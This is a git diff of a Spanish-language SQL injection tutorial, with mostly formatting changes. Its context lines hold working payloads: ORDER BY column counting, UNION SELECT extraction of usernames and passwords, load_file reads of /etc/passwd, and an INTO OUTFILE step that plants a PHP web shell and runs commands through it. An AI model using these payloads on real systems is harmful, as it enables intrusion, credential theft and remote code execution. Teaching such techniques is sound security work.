@@ -9,7 +9,8 @@ SELECT * FROM users WHERE username='' AND passwd=''
 <p align="center">
   <img src="https://i.postimg.cc/Fs1s7nJQ/sql-ejemplo-bool.png" alt="sql"/>
 </p>
-#### Determina el número de columnas devueltas por la consulta
+
+### Determina el número de columnas devueltas por la consulta
 - Aprovechando el manejo de error en la respuesta para saber el total de columnas.
 ```sql
 SELECT password,email FROM users WHERE username='pepe'' order by 2-- -
@@ -19,6 +20,7 @@ SELECT password,email FROM users WHERE username='pepe'' order by 2-- -
 <p align="center">
   <img src="https://i.postimg.cc/Z5MNWdqw/sql-ejemplo-error-ORDER-BY.png" alt="sql"/>
 </p>
+
 **Error ORDER BY**
 <p align="center">
   <img src="https://i.postimg.cc/pL3FQXxF/ERROR-sql.png" alt="sql"/>
@@ -37,10 +39,12 @@ SELECT password,email FROM users WHERE id=1 UNION SELECT "<?php system('whoami')
 <p align="center">
   <img src="https://i.postimg.cc/Z5KPBmx5/sql-inyeccion-code-y-dbuser.png" alt="sql"/>
 </p>
+
 - Mas ejemplos con el uso de UNION SELECT '',''-- -
 <p align="center">
   <img src="https://i.postimg.cc/6qxB0qpy/mas-ejemplos-con-UNION.png" alt="sql"/>
 </p>
+
 + Utilizando una inyección de código hacia un directorio como **/etc/hosts** o **/etc/passwd**
 <p align="center">
   <img src="https://i.postimg.cc/1X0nT1WV/load-file-sql.png" alt="sql"/>
@@ -91,6 +95,7 @@ Determina `' ORDER BY [num]-- -` el número de columnas en la tabla de la base d
 <p align="center">
   <img src="https://i.postimg.cc/N0GGQs8R/sqli.png" alt="sqli"/>
 </p>
+
 + Ejemplo.
 
 ```url
@@ -102,6 +107,7 @@ https://example.com/filter?category=gift' ORDER BY 4-- -
 <p align="center">
   <img src="https://i.postimg.cc/W1tQcpBz/image.png" alt="sql"/>
 </p>
+
 **"Al obtener un error se sabe que el número anterior es el número de columnas."**
 
 ##### 2.do Paso:
@@ -166,11 +172,11 @@ SELECT username,password FROM users UNION SELECT NULL,username||':'||password FR
 ```
 ---
 ### Ejecución remota SQLi
-1er paso:
+**1er paso:**
 ```sql
 ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shellsqli.php'-- -
 ```
-2do paso:
+**2do paso:**
 ```shell
 http://SERVER_IP:PORT/shellsqli.php?0=id
 ```
